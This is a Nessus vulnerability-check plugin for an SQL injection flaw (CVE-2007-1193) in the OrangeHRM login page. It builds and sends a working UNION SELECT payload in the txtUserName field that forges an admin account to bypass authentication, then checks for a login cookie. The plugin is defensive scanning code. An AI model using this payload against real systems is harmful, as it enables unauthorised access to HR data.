#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(24743);
  script_version("$Revision: 1.18 $");

  script_cve_id("CVE-2007-1193");
  script_bugtraq_id(22756);
  script_osvdb_id(50098);

  script_name(english:"OrangeHRM login.php txtUserName Parameter SQL Injection");
  script_summary(english:"Tries to bypass OrangeHRM's authentication");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a SQL
injection vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running OrangeHRM, a human resource management
system written in PHP. 

The version of OrangeHRM installed on the remote host fails to
sanitize input to the 'txtUserName' parameter of the 'login.php'
script before using it in a database query.  An unauthenticated, remote
attacker may be able to leverage this flaw to manipulate SQL queries
and, for example, bypass authentication, uncover sensitive
information, modify data, or even launch attacks against the
underlying database. 

Note that successful exploitation of this issue requires that PHP's
'magic_quotes_gpc' be disabled." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?3e41c792" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to OrangeHRM 2.1 alpha 5 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/03/01");
 script_cvs_date("$Date: 2016/05/12 14:46:30 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/orangehrm2", "/orangehrm", cgi_dirs()));
else dirs = make_list(cgi_dirs());

init_cookiejar();
foreach dir (dirs)
{
  # Make sure the affected script exists.
  url = string(dir, "/login.php");
  r = http_send_recv3(method: "GET", item:url, port:port);
  if (isnull(r)) exit(0);

  # If it does...
  if ("OrangeHRM" >< r[2] && '<input name="txtUserName"' >< r[2])
  {
    # Try to exploit the flaw to bypass authentication.
    pass = SCRIPT_NAME;
    exploit = string(unixtime(), "' UNION SELECT 'admin','", hexstr(MD5(pass)), "',null,'USR001','USG001','Enabled',null,'Yes'--");

    postdata = string(
      "actionID=chkAuthentication&",
      "txtUserName=", urlencode(str:exploit), "&",
      "txtPassword=", pass, "&",
      "Submit=Login"
    );
    r = http_send_recv3(method: "POST", item: url, version: 11, data: postdata, port: port,
   add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
    if (isnull(r)) exit(0);

    # There's a problem if we get a Loggedin cookie.
    if ("Loggedin=True" >< r[2])
    {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
